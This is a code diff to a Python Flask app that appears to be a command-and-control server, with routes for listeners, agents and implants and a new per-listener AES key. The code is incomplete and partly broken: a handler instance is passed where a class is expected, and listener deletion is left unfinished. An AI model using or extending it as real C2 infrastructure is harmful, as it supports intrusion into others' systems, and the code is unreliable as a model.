@@ -10,6 +10,9 @@ from random import choices
 from string import ascii_uppercase , digits
 import jwt 
 from hashlib import sha256
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
 ''' TO DO: 
 1- Implement a one time registration feature
@@ -24,7 +27,6 @@ if __name__ == "__main__":
                  'host': 'localhost',
                  'port': 27017		 } 
     
-    #This secret is for JWT. 
     _SECRET_ = "".join(choices(ascii_uppercase + digits, k = 20))
     _LISTENERS_ = dict()
 
@@ -48,12 +50,16 @@ if __name__ == "__main__":
                     try:
                         id = "".join(choices(digits, k = 5))    
                         port = int(request.form.get('port'))
-                        _LISTENERS_["listener_%s" % id] = HTTPServer(('0.0.0.0', port), Listener)
-                        saveListener(id, port)    
+                        _LISTENERS_["listener_%s" % id] = HTTPServer(('0.0.0.0', port), Listener(id))
+                        #----------------------------------------------------------------------
+                        AESKey = os.urandom(16)
+                        #----------------------------------------------------------------------
+                        saveListener(id, port, AESKey)    
                         listener = Thread(target= _LISTENERS_["listener_%s" % id].serve_forever) 
                         listener.daemon = True
                         listener.start()
-                        print(time.asctime(), "Start Listener - %s:%s"%('0.0.0.0', str(request.form.get('port'))))
+                        print(time.asctime(), "Start Server - %s:%s"%('0.0.0.0', str(request.form.get('port'))))
+
                         return 'Listener created successfully'
                     except: 
                         return 'Error while creating a listener!', 404
@@ -63,8 +69,6 @@ if __name__ == "__main__":
                         print(_LISTENERS_)
                         id = request.form.get('ListenerId')
                         _LISTENERS_["listener_%s" % id].server_close() 
-                        del _LISTENERS_["listener_%s" % id]
-                        print(time.asctime(), "Stop Listener - %s:%s"%('0.0.0.0', str(request.form.get('port'))))
                         return 'Listener deleted successfully', 200
                     else: 
                         return 'No Listener with specified ID found!', 404 
@@ -73,6 +77,8 @@ if __name__ == "__main__":
 
     @app.route('/agents', methods = ['GET']) 
     def agents(): 
+
+
         return 'Some code' 
 
     @app.route('/implant', methods = ['GET','POST']) 
